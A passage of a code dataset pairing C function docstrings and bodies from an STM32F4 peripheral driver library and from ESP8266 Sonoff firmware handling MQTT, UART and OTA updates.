"Software\\StdPeriph_Driver\\src\\stm32f4xx_exti.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Enables or disables the USART's 8x oversampling mode.\n  * @note   This function has to be called before calling USART_Init() function\n  *         in order to have correct baudrate Divider value.\n  * @param  USARTx: where x can be 1, 2, 3, 4, 5 or 6 to select the USART or \n  *         UART peripheral.\n  * @param  NewState: new state of the USART 8x oversampling mode.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void USART_OverSampling8Cmd(USART_TypeDef* USARTx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_USART_ALL_PERIPH(USARTx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  \n  if (NewState != DISABLE)\n  {\n    /* Enable the 8x Oversampling mode by setting the OVER8 bit in the CR1 register */\n    USARTx->CR1 |= USART_CR1_OVER8;\n  }\n  else\n  {\n    /* Disable the 8x Oversampling mode by clearing the OVER8 bit in the CR1 register */\n    USARTx->CR1 &= (uint16_t)~((uint16_t)USART_CR1_OVER8);\n  }\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Selects the USART WakeUp method.\n  * @param  USARTx: where x can be 1, 2, 3, 4, 5 or 6 to select the USART or \n  *         UART peripheral.\n  * @param  USART_WakeUp: specifies the USART wakeup method.\n  *          This parameter can be one of the following values:\n  *            @arg USART_WakeUp_IdleLine: WakeUp by an idle line detection\n  *            @arg USART_WakeUp_AddressMark: WakeUp by an address mark\n  * @retval None\n  */\n", "func_signal": "void USART_WakeUpConfig(USART_TypeDef* USARTx, uint16_t USART_WakeUp)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_USART_ALL_PERIPH(USARTx));\n  assert_param(IS_USART_WAKEUP(USART_WakeUp));\n  \n  USARTx->CR1 &= (uint16_t)~((uint16_t)USART_CR1_WAKE);\n  USARTx->CR1 |= USART_WakeUp;\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Configures the System clock source, PLL Multiplier and Divider factors, \n  *         AHB/APBx prescalers and Flash settings\n  * @Note   This function should be called only once the RCC clock configuration  \n  *         is reset to the default reset state (done in SystemInit() function).   \n  * @param  None\n  * @retval None\n  */\n", "func_signal": "static void SetSysClock(void)", "code": "{\n/******************************************************************************/\n/*            PLL (clocked by HSE) used as System clock source                */\n/******************************************************************************/\n  __IO uint32_t StartUpCounter = 0, HSEStatus = 0;\n  \n  /* Enable HSE */\n  RCC->CR |= ((uint32_t)RCC_CR_HSEON);\n \n  /* Wait till HSE is ready and if Time out is reached exit */\n  do\n  {\n    HSEStatus = RCC->CR & RCC_CR_HSERDY;\n    StartUpCounter++;\n  } while((HSEStatus == 0) && (StartUpCounter != HSE_STARTUP_TIMEOUT));\n\n  if ((RCC->CR & RCC_CR_HSERDY) != RESET)\n  {\n    HSEStatus = (uint32_t)0x01;\n  }\n  else\n  {\n    HSEStatus = (uint32_t)0x00;\n  }\n\n  if (HSEStatus == (uint32_t)0x01)\n  {\n    /* Select regulator voltage output Scale 1 mode, System frequency up to 168 MHz */\n    RCC->APB1ENR |= RCC_APB1ENR_PWREN;\n    PWR->CR |= PWR_CR_VOS;\n\n    /* HCLK = SYSCLK / 1*/\n    RCC->CFGR |= RCC_CFGR_HPRE_DIV1;\n      \n    /* PCLK2 = HCLK / 2*/\n    RCC->CFGR |= RCC_CFGR_PPRE2_DIV2;\n    \n    /* PCLK1 = HCLK / 4*/\n    RCC->CFGR |= RCC_CFGR_PPRE1_DIV4;\n\n    /* Configure the main PLL */\n    RCC->PLLCFGR = PLL_M | (PLL_N << 6) | (((PLL_P >> 1) -1) << 16) |\n                   (RCC_PLLCFGR_PLLSRC_HSE) | (PLL_Q << 24);\n\n    /* Enable the main PLL */\n    RCC->CR |= RCC_CR_PLLON;\n\n    /* Wait till the main PLL is ready */\n    while((RCC->CR & RCC_CR_PLLRDY) == 0)\n    {\n    }\n   \n    /* Configure Flash prefetch, Instruction cache, Data cache and wait state */\n    FLASH->ACR = FLASH_ACR_ICEN |FLASH_ACR_DCEN |FLASH_ACR_LATENCY_5WS;\n\n    /* Select the main PLL as system clock source */\n    RCC->CFGR &= (uint32_t)((uint32_t)~(RCC_CFGR_SW));\n    RCC->CFGR |= RCC_CFGR_SW_PLL;\n\n    /* Wait till the main PLL is used as system clock source */\n    while ((RCC->CFGR & (uint32_t)RCC_CFGR_SWS ) != RCC_CFGR_SWS_PLL);\n    {\n    }\n  }\n  else\n  { /* If HSE fails to start-up, the application will have wrong clock\n         configuration. User can add here some code to deal with this error */\n  }\n\n}", "path": "Software\\CMSIS\\system_stm32f4xx-168.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Fills each USART_InitStruct member with its default value.\n  * @param  USART_InitStruct: pointer to a USART_InitTypeDef structure which will\n  *         be initialized.\n  * @retval None\n  */\n", "func_signal": "void USART_StructInit(USART_InitTypeDef* USART_InitStruct)", "code": "{\n  /* USART_InitStruct members default value */\n  USART_InitStruct->USART_BaudRate = 9600;\n  USART_InitStruct->USART_WordLength = USART_WordLength_8b;\n  USART_InitStruct->USART_StopBits = USART_StopBits_1;\n  USART_InitStruct->USART_Parity = USART_Parity_No ;\n  USART_InitStruct->USART_Mode = USART_Mode_Rx | USART_Mode_Tx;\n  USART_InitStruct->USART_HardwareFlowControl = USART_HardwareFlowControl_None;  \n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  MQTT initialization connection function\n  * @param  client:   MQTT_Client reference\n  * @param  host:   Domain or IP string\n  * @param  port:   Port to connect\n  * @param  security:   1 for ssl, 0 for none\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nMQTT_InitConnection(MQTT_Client *mqttClient, uint8_t* host, uint32_t port, uint8_t security)", "code": "{\n  uint32_t temp;\n  INFO(\"MQTT_InitConnection\\r\\n\");\n  os_memset(mqttClient, 0, sizeof(MQTT_Client));\n  temp = os_strlen(host);\n  mqttClient->host = (uint8_t*)os_zalloc(temp + 1);\n  os_strcpy(mqttClient->host, host);\n  mqttClient->host[temp] = 0;\n  mqttClient->port = port;\n  mqttClient->security = security;\n\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/*\n* Only http is supported but a different port may be used.\n* The following urls are handled correctly:\n*   http://sidnas2:80/api/sensor1/user1.bin\n*   http://sidnas2/api/sensor1/user1.bin\n*   sidnas2/api/sensor1/user1.bin\n*/\n", "func_signal": "void ICACHE_FLASH_ATTR\nstart_ota(char *url)", "code": "{\n  int i;\n  char *str, *str2, *p, *q;\n  ota_t *ota_client = &ota_cdn;\n\n  ota_restart_flg = 0;\n\n  os_memset(ota_client, '\\0', sizeof(ota_t));\n  str = strtok_r(url, \"/\", &p);     // http: or sidnas2:80 or sidnas2\n  str2 = strstr(str, \":\");          // : or :80 or null\n  if (str2 && os_strlen(str2) == 1) {\n    p++;                            // skip http://\n    str = strtok_r(NULL, \"/\", &p);  // sidnas2:80 or sidnas2\n    str2 = strstr(str, \":\");        // :80 or null\n  }\n  if (str2) {\n    i = str2 - str;\n    str[i] = 0;                     // sidnas2\n    ota_client->host = (char*)os_zalloc(os_strlen(str)+1);\n    os_strncpy(ota_client->host, str, os_strlen(str));\n    str[i] = ':';                   // sidnas2:80\n    str2++;\n    ota_client->port = atoi(str2);\n  } else {\n    ota_client->host = (char*)os_zalloc(os_strlen(str)+1);\n    os_strncpy(ota_client->host, str, os_strlen(str));\n    ota_client->port = 80;\n  }\n  i = os_strlen(str);\n  str[i] = '/';\n  p--;\n  str = strtok_r(NULL, \".\", &p);    // /api/sensor1/user1\n  i = os_strlen(str);\n  str[i] = '.';                     // /api/sensor1/user1.bin\n  if(system_upgrade_userbin_check() == UPGRADE_FW_BIN1)\n    str[i-1] = '2';                 // /api/sensor1/user2.bin\n  if(system_upgrade_userbin_check() == UPGRADE_FW_BIN2)\n    str[i-1] = '1';                 // /api/sensor1/user1.bin\n  ota_client->url = (char*)os_zalloc(os_strlen(str)+1);\n  os_strncpy(ota_client->url, str, os_strlen(str));\n\n  os_timer_disarm(&ota_timer);\n  os_timer_setfn(&ota_timer, (os_timer_func_t *)start_ota_cb, ota_client);\n  os_timer_arm(&ota_timer, 2000, 0);\n}", "path": "sonoff\\modules\\ota.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/******************************************************************************\n * FunctionName : uart0_tx_buffer\n * Description  : use uart0 to transfer buffer\n * Parameters   : uint8 *buf - point to send buffer\n *                uint16 len - buffer len\n * Returns      :\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuart0_tx_buffer(uint8 *buf, uint16 len)", "code": "{\n  uint16 i;\n\n  for (i = 0; i < len; i++)\n  {\n    uart_tx_one_char(UART0, buf[i]);\n  }\n}", "path": "sonoff\\modules\\uart.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/******************************************************************************\n * FunctionName : uart0_sendStr\n * Description  : use uart0 to transfer buffer\n * Parameters   : uint8 *buf - point to send buffer\n *                uint16 len - buffer len\n * Returns      :\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuart0_sendStr(const char *str)", "code": "{\n  while(*str)\n  {\n    uart_tx_one_char(UART0, *str++);\n  }\n}", "path": "sonoff\\modules\\uart.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/******************************************************************************\n * FunctionName : uart0_rx_intr_handler\n * Description  : Internal used function\n *                UART0 interrupt handler, add self handle code inside\n * Parameters   : void *para - point to ETS_UART_INTR_ATTACH's arg\n * Returns      : NONE\n*******************************************************************************/\n//extern void at_recvTask(void);\n", "func_signal": "LOCAL void\nuart0_rx_intr_handler(void *para)", "code": "{\n  uint8 RcvChar;\n  uint8 uart_no = UART0;//UartDev.buff_uart_no;\n\n  if(UART_FRM_ERR_INT_ST == (READ_PERI_REG(UART_INT_ST(uart_no)) & UART_FRM_ERR_INT_ST))\n  {\n    INFO(\"UART: FRM_ERR\\r\\n\");\n    WRITE_PERI_REG(UART_INT_CLR(uart_no), UART_FRM_ERR_INT_CLR);\n  }\n\n  if(UART_RXFIFO_FULL_INT_ST == (READ_PERI_REG(UART_INT_ST(uart_no)) & UART_RXFIFO_FULL_INT_ST))\n  {\n    ETS_UART_INTR_DISABLE();/////////\n\n    while(READ_PERI_REG(UART_STATUS(UART0)) & (UART_RXFIFO_CNT << UART_RXFIFO_CNT_S))\n    {\n      WRITE_PERI_REG(0X60000914, 0x73); //WDT\n      RcvChar = READ_PERI_REG(UART_FIFO(UART0)) & 0xFF;\n      CMD_Input(RcvChar);\n    }\n  }\n  else if(UART_RXFIFO_TOUT_INT_ST == (READ_PERI_REG(UART_INT_ST(uart_no)) & UART_RXFIFO_TOUT_INT_ST))\n  {\n    ETS_UART_INTR_DISABLE();/////////\n    while(READ_PERI_REG(UART_STATUS(UART0)) & (UART_RXFIFO_CNT << UART_RXFIFO_CNT_S))\n    {\n      WRITE_PERI_REG(0X60000914, 0x73); //WDT\n      RcvChar = READ_PERI_REG(UART_FIFO(UART0)) & 0xFF;\n      CMD_Input(RcvChar);\n    }\n  }\n\n  if(UART_RXFIFO_FULL_INT_ST == (READ_PERI_REG(UART_INT_ST(UART0)) & UART_RXFIFO_FULL_INT_ST))\n  {\n    WRITE_PERI_REG(UART_INT_CLR(UART0), UART_RXFIFO_FULL_INT_CLR);\n  }\n  else if(UART_RXFIFO_TOUT_INT_ST == (READ_PERI_REG(UART_INT_ST(UART0)) & UART_RXFIFO_TOUT_INT_ST))\n  {\n    WRITE_PERI_REG(UART_INT_CLR(UART0), UART_RXFIFO_TOUT_INT_CLR);\n  }\n  ETS_UART_INTR_ENABLE();\n}", "path": "sonoff\\modules\\uart.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/**\n  * @brief  Begin connect to MQTT broker\n  * @param  client: MQTT_Client reference\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nMQTT_Connect(MQTT_Client *mqttClient)", "code": "{\n  // Do not connect if this client is already connected otherwise the\n  // two espconn connections may interfere causing unexpected behaviour.\n  if (mqttClient->pCon) {\n    return;\n  }\n  mqttClient->pCon = (struct espconn *)os_zalloc(sizeof(struct espconn));\n  mqttClient->pCon->type = ESPCONN_TCP;\n  mqttClient->pCon->state = ESPCONN_NONE;\n  mqttClient->pCon->proto.tcp = (esp_tcp *)os_zalloc(sizeof(esp_tcp));\n  mqttClient->pCon->proto.tcp->local_port = espconn_port();\n  mqttClient->pCon->proto.tcp->remote_port = mqttClient->port;\n  mqttClient->pCon->reverse = mqttClient;\n  espconn_regist_connectcb(mqttClient->pCon, mqtt_tcpclient_connect_cb);\n  espconn_regist_reconcb(mqttClient->pCon, mqtt_tcpclient_recon_cb);\n\n  mqttClient->keepAliveTick = 0;\n  mqttClient->reconnectTick = 0;\n\n\n  os_timer_disarm(&mqttClient->mqttTimer);\n  os_timer_setfn(&mqttClient->mqttTimer, (os_timer_func_t *)mqtt_timer, mqttClient);\n  os_timer_arm(&mqttClient->mqttTimer, 1000, 1);\n\n  if (UTILS_StrToIP(mqttClient->host, &mqttClient->pCon->proto.tcp->remote_ip)) {\n    INFO(\"TCP: Connect to ip  %s:%d\\r\\n\", mqttClient->host, mqttClient->port);\n    if (mqttClient->security)\n    {\n#ifdef MQTT_SSL_ENABLE\n      espconn_secure_connect(mqttClient->pCon);\n#else\n      INFO(\"TCP: Do not support SSL\\r\\n\");\n#endif\n    }\n    else\n    {\n      espconn_connect(mqttClient->pCon);\n    }\n  }\n  else {\n    INFO(\"TCP: Connect to domain %s:%d\\r\\n\", mqttClient->host, mqttClient->port);\n    espconn_gethostbyname(mqttClient->pCon, mqttClient->host, &mqttClient->ip, mqtt_dns_found);\n  }\n  mqttClient->connState = TCP_CONNECTING;\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/**\n  * @brief  Delete tcp client and free all memory\n  * @param  mqttClient: The mqtt client which contain TCP client\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_tcpclient_delete(MQTT_Client *mqttClient)", "code": "{\n  if (mqttClient->pCon != NULL) {\n    INFO(\"Free memory\\r\\n\");\n    espconn_delete(mqttClient->pCon);\n    if (mqttClient->pCon->proto.tcp)\n      os_free(mqttClient->pCon->proto.tcp);\n    os_free(mqttClient->pCon);\n    mqttClient->pCon = NULL;\n  }\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/**\n  * @brief  Client send over callback function.\n  * @param  arg: contain the ip link information\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_tcpclient_sent_cb(void *arg)", "code": "{\n  struct espconn *pCon = (struct espconn *)arg;\n  MQTT_Client* client = (MQTT_Client *)pCon->reverse;\n  INFO(\"TCP: Sent\\r\\n\");\n  client->sendTimeout = 0;\n  if ((client->connState == MQTT_DATA || client->connState == MQTT_KEEPALIVE_SEND)\n        && client->mqtt_state.pending_msg_type == MQTT_MSG_TYPE_PUBLISH) {\n    if (client->publishedCb)\n      client->publishedCb((uint32_t*)client);\n  }\n  system_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/******************************************************************************\n * FunctionName : uart_init\n * Description  : user interface for init uart\n * Parameters   : UartBautRate uart0_br - uart0 bautrate\n *                UartBautRate uart1_br - uart1 bautrate\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuart_init(UartBautRate uart0_br, UartBautRate uart1_br)", "code": "{\n  // rom use 74880 baut_rate, here reinitialize\n  UartDev.baut_rate = uart0_br;\n  uart_config(UART0);\n  UartDev.baut_rate = uart1_br;\n  uart_config(UART1);\n  ETS_UART_INTR_ENABLE();\n\n  // install uart1 putc callback\n  os_install_putc1((void *)uart0_write_char);\n\n  serialInBuf[0] = 0;\n}", "path": "sonoff\\modules\\uart.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/**\n  * @brief  Client received callback function.\n  * @param  arg: contain the ip link information\n  * @param  pdata: received data\n  * @param  len: the lenght of received data\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_tcpclient_recv(void *arg, char *pdata, unsigned short len)", "code": "{\n  uint8_t msg_type;\n  uint8_t msg_qos;\n  uint16_t msg_id;\n\n  struct espconn *pCon = (struct espconn*)arg;\n  MQTT_Client *client = (MQTT_Client *)pCon->reverse;\n\nREADPACKET:\n  INFO(\"TCP: data received %d bytes\\r\\n\", len);\n  if (len < MQTT_BUF_SIZE && len > 0) {\n    os_memcpy(client->mqtt_state.in_buffer, pdata, len);\n\n    msg_type = mqtt_get_type(client->mqtt_state.in_buffer);\n    msg_qos = mqtt_get_qos(client->mqtt_state.in_buffer);\n    msg_id = mqtt_get_id(client->mqtt_state.in_buffer, client->mqtt_state.in_buffer_length);\n    switch (client->connState) {\n    case MQTT_CONNECT_SENDING:\n      if (msg_type == MQTT_MSG_TYPE_CONNACK) {\n        if (client->mqtt_state.pending_msg_type != MQTT_MSG_TYPE_CONNECT) {\n          INFO(\"MQTT: Invalid packet\\r\\n\");\n          if (client->security) {\n#ifdef MQTT_SSL_ENABLE\n            espconn_secure_disconnect(client->pCon);\n#else\n            INFO(\"TCP: Do not support SSL\\r\\n\");\n#endif\n          }\n          else {\n            espconn_disconnect(client->pCon);\n          }\n        } else {\n          INFO(\"MQTT: Connected to %s:%d\\r\\n\", client->host, client->port);\n          client->connState = MQTT_DATA;\n          if (client->connectedCb)\n            client->connectedCb((uint32_t*)client);\n        }\n\n      }\n      break;\n    case MQTT_DATA:\n    case MQTT_KEEPALIVE_SEND:\n      client->mqtt_state.message_length_read = len;\n      client->mqtt_state.message_length = mqtt_get_total_length(client->mqtt_state.in_buffer, client->mqtt_state.message_length_read);\n\n\n      switch (msg_type)\n      {\n\n      case MQTT_MSG_TYPE_SUBACK:\n        if (client->mqtt_state.pending_msg_type == MQTT_MSG_TYPE_SUBSCRIBE && client->mqtt_state.pending_msg_id == msg_id)\n          INFO(\"MQTT: Subscribe successful\\r\\n\");\n        break;\n      case MQTT_MSG_TYPE_UNSUBACK:\n        if (client->mqtt_state.pending_msg_type == MQTT_MSG_TYPE_UNSUBSCRIBE && client->mqtt_state.pending_msg_id == msg_id)\n          INFO(\"MQTT: UnSubscribe successful\\r\\n\");\n        break;\n      case MQTT_MSG_TYPE_PUBLISH:\n        if (msg_qos == 1)\n          client->mqtt_state.outbound_message = mqtt_msg_puback(&client->mqtt_state.mqtt_connection, msg_id);\n        else if (msg_qos == 2)\n          client->mqtt_state.outbound_message = mqtt_msg_pubrec(&client->mqtt_state.mqtt_connection, msg_id);\n        if (msg_qos == 1 || msg_qos == 2) {\n          INFO(\"MQTT: Queue response QoS: %d\\r\\n\", msg_qos);\n          if (QUEUE_Puts(&client->msgQueue, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length) == -1) {\n            INFO(\"MQTT: Queue full\\r\\n\");\n          }\n        }\n\n        deliver_publish(client, client->mqtt_state.in_buffer, client->mqtt_state.message_length_read);\n        break;\n      case MQTT_MSG_TYPE_PUBACK:\n        if (client->mqtt_state.pending_msg_type == MQTT_MSG_TYPE_PUBLISH && client->mqtt_state.pending_msg_id == msg_id) {\n          INFO(\"MQTT: received MQTT_MSG_TYPE_PUBACK, finish QoS1 publish\\r\\n\");\n        }\n\n        break;\n      case MQTT_MSG_TYPE_PUBREC:\n        client->mqtt_state.outbound_message = mqtt_msg_pubrel(&client->mqtt_state.mqtt_connection, msg_id);\n        if (QUEUE_Puts(&client->msgQueue, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length) == -1) {\n          INFO(\"MQTT: Queue full\\r\\n\");\n        }\n        break;\n      case MQTT_MSG_TYPE_PUBREL:\n        client->mqtt_state.outbound_message = mqtt_msg_pubcomp(&client->mqtt_state.mqtt_connection, msg_id);\n        if (QUEUE_Puts(&client->msgQueue, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length) == -1) {\n          INFO(\"MQTT: Queue full\\r\\n\");\n        }\n        break;\n      case MQTT_MSG_TYPE_PUBCOMP:\n        if (client->mqtt_state.pending_msg_type == MQTT_MSG_TYPE_PUBLISH && client->mqtt_state.pending_msg_id == msg_id) {\n          INFO(\"MQTT: receive MQTT_MSG_TYPE_PUBCOMP, finish QoS2 publish\\r\\n\");\n        }\n        break;\n      case MQTT_MSG_TYPE_PINGREQ:\n        client->mqtt_state.outbound_message = mqtt_msg_pingresp(&client->mqtt_state.mqtt_connection);\n        if (QUEUE_Puts(&client->msgQueue, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length) == -1) {\n          INFO(\"MQTT: Queue full\\r\\n\");\n        }\n        break;\n      case MQTT_MSG_TYPE_PINGRESP:\n        // Ignore\n        break;\n      }\n      // NOTE: this is done down here and not in the switch case above\n      // because the PSOCK_READBUF_LEN() won't work inside a switch\n      // statement due to the way protothreads resume.\n      if (msg_type == MQTT_MSG_TYPE_PUBLISH)\n      {\n        len = client->mqtt_state.message_length_read;\n\n        if (client->mqtt_state.message_length < client->mqtt_state.message_length_read)\n        {\n          //client->connState = MQTT_PUBLISH_RECV;\n          //Not Implement yet\n          len -= client->mqtt_state.message_length;\n          pdata += client->mqtt_state.message_length;\n\n          INFO(\"Get another published message\\r\\n\");\n          goto READPACKET;\n        }\n\n      }\n      break;\n    }\n  } else {\n    INFO(\"ERROR: Message too long\\r\\n\");\n  }\n  system_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/**\n  * @brief  MQTT subscibe function.\n  * @param  client:   MQTT_Client reference\n  * @param  topic:    string topic will subscribe\n  * @param  qos:    qos\n  * @retval TRUE if success queue\n  */\n", "func_signal": "BOOL ICACHE_FLASH_ATTR\nMQTT_Subscribe(MQTT_Client *client, char* topic, uint8_t qos)", "code": "{\n  uint8_t dataBuffer[MQTT_BUF_SIZE];\n  uint16_t dataLen;\n\n  client->mqtt_state.outbound_message = mqtt_msg_subscribe(&client->mqtt_state.mqtt_connection,\n                                        topic, qos,\n                                        &client->mqtt_state.pending_msg_id);\n  INFO(\"MQTT: queue subscribe, topic\\\"%s\\\", id: %d\\r\\n\", topic, client->mqtt_state.pending_msg_id);\n  while (QUEUE_Puts(&client->msgQueue, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length) == -1) {\n    INFO(\"MQTT: Queue full\\r\\n\");\n    if (QUEUE_Gets(&client->msgQueue, dataBuffer, &dataLen, MQTT_BUF_SIZE) == -1) {\n      INFO(\"MQTT: Serious buffer error\\r\\n\");\n      return FALSE;\n    }\n  }\n  system_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n  return TRUE;\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/**\n  * @brief  Tcp client connect repeat callback function.\n  * @param  arg: contain the ip link information\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_tcpclient_recon_cb(void *arg, sint8 errType)", "code": "{\n  struct espconn *pCon = (struct espconn *)arg;\n  MQTT_Client* client = (MQTT_Client *)pCon->reverse;\n\n  INFO(\"TCP: Reconnect to %s:%d\\r\\n\", client->host, client->port);\n\n  client->connState = TCP_RECONNECT_REQ;\n\n  system_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/**\n  * @brief  MQTT ping function.\n  * @param  client:   MQTT_Client reference\n  * @retval TRUE if success queue\n  */\n", "func_signal": "BOOL ICACHE_FLASH_ATTR\nMQTT_Ping(MQTT_Client *client)", "code": "{\n  uint8_t dataBuffer[MQTT_BUF_SIZE];\n  uint16_t dataLen;\n  client->mqtt_state.outbound_message = mqtt_msg_pingreq(&client->mqtt_state.mqtt_connection);\n  if(client->mqtt_state.outbound_message->length == 0){\n    INFO(\"MQTT: Queuing publish failed\\r\\n\");\n    return FALSE;\n  }\n  INFO(\"MQTT: queuing publish, length: %d, queue size(%d/%d)\\r\\n\", client->mqtt_state.outbound_message->length, client->msgQueue.rb.fill_cnt, client->msgQueue.rb.size);\n  while(QUEUE_Puts(&client->msgQueue, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length) == -1){\n    INFO(\"MQTT: Queue full\\r\\n\");\n    if(QUEUE_Gets(&client->msgQueue, dataBuffer, &dataLen, MQTT_BUF_SIZE) == -1) {\n      INFO(\"MQTT: Serious buffer error\\r\\n\");\n      return FALSE;\n    }\n  }\n  system_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n  return TRUE;\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/**\n  * @brief  Tcp client connect success callback function.\n  * @param  arg: contain the ip link information\n  * @retval None\n  */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmqtt_tcpclient_connect_cb(void *arg)", "code": "{\n  struct espconn *pCon = (struct espconn *)arg;\n  MQTT_Client* client = (MQTT_Client *)pCon->reverse;\n\n  espconn_regist_disconcb(client->pCon, mqtt_tcpclient_discon_cb);\n  espconn_regist_recvcb(client->pCon, mqtt_tcpclient_recv);////////\n  espconn_regist_sentcb(client->pCon, mqtt_tcpclient_sent_cb);///////\n  INFO(\"MQTT: Connected to broker %s:%d\\r\\n\", client->host, client->port);\n\n  mqtt_msg_init(&client->mqtt_state.mqtt_connection, client->mqtt_state.out_buffer, client->mqtt_state.out_buffer_length);\n  client->mqtt_state.outbound_message = mqtt_msg_connect(&client->mqtt_state.mqtt_connection, client->mqtt_state.connect_info);\n  client->mqtt_state.pending_msg_type = mqtt_get_type(client->mqtt_state.outbound_message->data);\n  client->mqtt_state.pending_msg_id = mqtt_get_id(client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length);\n\n\n  client->sendTimeout = MQTT_SEND_TIMOUT;\n  INFO(\"MQTT: Sending, type: %d, id: %04X\\r\\n\", client->mqtt_state.pending_msg_type, client->mqtt_state.pending_msg_id);\n  if (client->security) {\n#ifdef MQTT_SSL_ENABLE\n    espconn_secure_send(client->pCon, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length);\n#else\n    INFO(\"TCP: Do not support SSL\\r\\n\");\n#endif\n  }\n  else {\n    espconn_send(client->pCon, client->mqtt_state.outbound_message->data, client->mqtt_state.outbound_message->length);\n  }\n\n  client->mqtt_state.outbound_message = NULL;\n  client->connState = MQTT_CONNECT_SENDING;\n  system_os_post(MQTT_TASK_PRIO, 0, (os_param_t)client);\n}", "path": "sonoff\\modules\\mqtt\\mqtt.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
{"docstring": "/******************************************************************************\n * FunctionName : uart1_write_char\n * Description  : Internal used function\n *                Do some special deal while tx char is '\\r' or '\\n'\n * Parameters   : char c - character to tx\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuart1_write_char(char c)", "code": "{\n  if (c == '\\n')\n  {\n    uart_tx_one_char(UART1, '\\r');\n    uart_tx_one_char(UART1, '\\n');\n  }\n  else if (c == '\\r')\n  {\n  }\n  else\n  {\n    uart_tx_one_char(UART1, c);\n  }\n}", "path": "sonoff\\modules\\uart.c", "repo_name": "arendst/Sonoff-MQTT-OTA", "stars": 203, "license": "None", "language": "c", "size": 733}
